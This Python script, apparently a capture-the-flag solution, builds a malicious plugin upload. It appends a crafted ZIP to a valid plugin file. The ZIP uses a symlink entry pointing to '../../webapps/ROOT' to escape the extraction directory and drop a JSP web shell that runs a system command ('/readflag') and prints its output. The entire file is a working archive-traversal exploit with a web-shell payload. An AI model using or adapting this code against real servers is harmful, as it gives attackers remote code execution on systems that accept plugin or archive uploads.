import zipfile
import os
import sys

VALID_PLUGIN = "hello-world.plugin"  # Must exist in the same folder
OUTPUT_PLUGIN = "exploit.plugin"
SHELL_NAME = "pwn.jsp"

# The JSP Payload
JSP_PAYLOAD = '''
<%@ page import="java.util.*,java.io.*" %>
<%
    try {
        Process p = Runtime.getRuntime().exec("/readflag");
        InputStream i = p.getInputStream();
        Scanner s = new Scanner(i).useDelimiter("\\\\A");
        String output = s.hasNext() ? s.next() : "";
        out.println(output);
    } catch(Exception e) {
        out.println("Error: " + e.getMessage());
    }
%>
'''

def create_malicious_zip(temp_zip_name):
    zip_file = zipfile.ZipFile(temp_zip_name, 'w', zipfile.ZIP_DEFLATED)

    symlink_target = "../../webapps/ROOT"

    info = zipfile.ZipInfo("link")
    info.create_system = 3  # Unix
    info.external_attr = 0xA1ED0000 # Symlink attribute
    zip_file.writestr(info, symlink_target)

    zip_file.writestr("link/" + SHELL_NAME, JSP_PAYLOAD)

    zip_file.close()
    print(f"[+] Malicious ZIP created: {temp_zip_name}")

def combine_plugins():
    if not os.path.exists(VALID_PLUGIN):
        print(f"[-] Error: {VALID_PLUGIN} not found.")
        sys.exit(1)

    with open(VALID_PLUGIN, 'rb') as f:
        valid_data = f.read()

    create_malicious_zip("temp_malicious.zip")

    with open("temp_malicious.zip", 'rb') as f:
        malicious_data = f.read()

    final_data = valid_data + malicious_data

    with open(OUTPUT_PLUGIN, 'wb') as f:
        f.write(final_data)

    print(f"[+] Exploitable plugin generated: {OUTPUT_PLUGIN}")
    print(f"[+] Size: {len(final_data)} bytes")
    os.remove("temp_malicious.zip")

if __name__ == "__main__":
    combine_plugins()